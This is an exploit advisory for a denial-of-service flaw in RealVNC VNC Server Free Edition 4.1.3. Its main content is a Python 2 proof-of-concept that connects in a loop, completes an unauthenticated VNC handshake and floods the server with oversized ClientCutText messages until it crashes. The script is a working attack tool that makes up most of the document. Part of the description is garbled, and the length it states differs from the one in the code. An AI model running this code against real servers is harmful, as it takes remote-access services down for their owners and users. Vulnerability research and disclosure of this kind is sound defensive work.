RealVNC VNC Server Free Edition 4.1.3 Denial of Service
=======================================================

#==================================================================================================#
#                                                                                                  #
#  $$$$$$$\  $$\                     $$\                                     $$\        $$$$$$\    #
#  $$  __$$\ \__|                    $$ |                                    $$ |      $$  __$$\   #
#  $$ |  $$ |$$\  $$$$$$$\  $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$ |      $$ /  $$ |  #
#  $$$$$$$\ |$$ |$$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$$$$$$$ |  #
#  $$  __$$\ $$ |\$$$$$$\  $$ /  $$ |$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$ /  $$ |$$ |      $$  __$$ |  #
#  $$ |  $$ |$$ | \____$$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |  #
#  $$$$$$$  |$$ |$$$$$$$  |$$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |      $$ |  $$ |  #
#  \_______/ \__|\_______/ $$  ____/ \__|  \__| \_______|\__|  \__| \______/ \__|      \__|  \__|  #
#                          $$ |                                                                    #
#                          $$ |                                         Plastics Make It Possible  #
#                          \__|                                                                    #
#                                                                                                  #
#==================================================================================================#
#                                                                                                  #
# Vulnerability............Denial-of-Service                                                       #
# Software.................RealVNC VNC Server Free Edition 4.1.3                                   #
# Download.................http://www.realvnc.com/products/free/4.1/download.html                  #

#==================================================================================================#
#                                                                                                  #
# ##Description##                                                                                  #
#                                                                                                  #
# Sending a ClientCutText Message with a length of 0xFFFFFFFF crashes the server with the          #
# for the sake of simplicity this script only works on servers configured to run with no           #
# authentication.                                                                                  #
#                                                                                                  #
# winvnc4.exe: The instruction at 0x425BE4 referenced memory at 0xFFFFFF00. The memory could not   #
# be written (0x00425BE4 -> FFFFFF00)                                                              #
#                                                                                                  #
#                                                                                                  #
# ##Proof of Concept##                                                                             #
import sys, struct, socket
host =&#039;localhost&#039;
port = 5900

def crash_vnc_server():
    try:
        while 1:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(1.0)       
            
            print &#039;Connected&#039;

            try:
                b = s.recv(8192)
                print &#039;ProtocolVersion Received&#039;
                
                s.send(b)
                print &#039;ProtocolVersion Sent&#039;            
                
                b = s.recv(8192)
                print &#039;Security Received&#039;

                s.send(&#039;\x01&#039;)
                print &#039;Security Sent&#039;
                
                # Recv SecurityResult
                b = s.recv(8192)
                print &#039;SecurityResult Received&#039;

                if (len(b) == 4 and
                    b[0] == chr(0) and
                    b[1] == chr(0) and
                    b[2] == chr(0) and
                    b[3] == chr(0)):
                    print &#039;SecurityResult OK&#039;
                else:
                    print &#039;SecurityResult Failed.\n\nThe server must be set &#039;\
                          &#039;to No Authentication for this to work, otherwise &#039;\
                          &#039;you \&#039;ll need to write the necessary client side &#039;\
                          &#039;authentication code yourself.&#039;
                    return           

                s.send(&#039;\x01&#039;)
                print &#039;ClientInit Sent&#039;
                
                b = s.recv(8192)
                print &#039;ServerInit Received&#039;

                text_len = 0xFFFFFF
                text_str = struct.pack(&#039;L&#039;, text_len) + &#039;\xAA&#039; * text_len
                
                while 1:
                    s.send(&#039;\x06\x00\x00\x00&#039; + text_str)

                    print &#039;ClientCutText Sent&#039;
                
            except Exception:
                print &#039;Connection closed&#039;                
            
    except Exception:
        print &#039;Couldn\&#039;t connect&#039;

crash_vnc_server()




